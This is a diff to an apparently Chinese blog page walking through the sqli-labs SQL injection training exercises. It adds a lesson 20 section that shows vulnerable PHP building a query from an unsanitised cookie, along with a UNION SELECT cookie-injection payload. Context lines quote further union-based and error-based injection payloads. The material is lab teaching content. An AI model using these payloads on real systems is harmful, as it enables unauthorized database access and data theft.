@@ -44,7 +44,8 @@
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-392f0b7426dd524f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-7aa72f550de5cdce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-58c35ddffaa57ed8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2019-01-20T13:30:55.002Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-688ec31978908711.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-01-20T13:35:56.787Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs学习（lesson1-lesson20）">
 <meta name="twitter:description" content="lesson1：插入单引号报错id被单引号包裹，确认字段数  ?id=1’ order by 3–+  字段为3，使用union select 1,2,3联合查询语句查看页面是否有显示位  ?id=-1’ union select 1,2,3–+  有两个显示位，接下来开始爆库名  ?id=-1’ union select 1,(select group_concat(schema_name) f">
@@ -327,7 +328,13 @@
 <blockquote>
 <p>‘ or (select 1 from (select count(<em>),concat(database(), ‘~’ , floor (rand()</em>2))as a from information_schema.tables group by a) as b limit 0,1) , ‘1’)#<br><img src="https://upload-images.jianshu.io/upload_images/15184404-58c35ddffaa57ed8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>其余方法同上</p>
 </blockquote>
-<h1 id="lesson20："><a href="#lesson20：" class="headerlink" title="lesson20："></a>lesson20：</h1>
+<h1 id="lesson20："><a href="#lesson20：" class="headerlink" title="lesson20："></a>lesson20：</h1><p>查看源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cookee = $_COOKIE[&apos;uname&apos;];</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE username=&apos;$cookee&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure></p>
+<p>存在cookie注入</p>
+<blockquote>
+<p>uname =  ‘ union select 1 , 2 , database()#</p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-688ec31978908711.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>其他同理</p>
+
       
 
       
